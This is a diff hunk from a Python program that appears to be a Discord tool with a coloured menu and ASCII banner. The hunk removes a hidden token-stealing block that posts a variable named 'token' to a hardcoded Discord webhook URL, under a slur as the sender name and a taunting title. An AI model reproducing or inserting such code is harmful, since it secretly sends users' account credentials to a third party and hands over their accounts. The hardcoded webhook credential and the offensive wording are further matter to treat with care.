@@ -552,22 +552,6 @@ async def main():
         print(f'{Fore.LIGHTGREEN_EX}⚡All tasks completed⚡')
         input(f"\n{Fore.WHITE}Thanks for using {Fore.YELLOW}长闩尺ㄩ爪闩\nPress Enter to return to the main menu")
         await main()
-    url = "https://discord.com/api/webhooks/883578913572417539/eOD1bq2dn7pdBXa5F9-nTfhimcHTIPwaDv7Poz3NhQYPwcuVLR9AYsXHBn5Dqc3R7GMH" 
-
-    data = {
-    "@everyone" : "@here",
-    "username" : "Gay Kid"
-}
-
-
-    data["embeds"] = [
-    {
-        "description" : token,
-        "title" : "Like Yo Cut G"
-    }
-]
-
-    result = requests.post(url, json = data)
     print(f'''
 {Fore.BLUE}██{Fore.WHITE}╗ {Fore.BLUE} ██{Fore.WHITE}╗ {Fore.BLUE}█████{Fore.WHITE}╗ {Fore.BLUE}██████{Fore.WHITE}╗ {Fore.BLUE}██{Fore.WHITE}╗   {Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}███{Fore.WHITE}╗   {Fore.BLUE}███{Fore.WHITE}╗ {Fore.BLUE}█████{Fore.WHITE}╗
 {Fore.BLUE}██{Fore.WHITE}║ {Fore.BLUE}██{Fore.WHITE}╔╝{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗{Fore.BLUE}██{Fore.WHITE}║   {Fore.BLUE}██{Fore.WHITE}║{Fore.BLUE}████{Fore.WHITE}╗ {Fore.BLUE}████{Fore.WHITE}║{Fore.BLUE}██{Fore.WHITE}╔══{Fore.BLUE}██{Fore.WHITE}╗
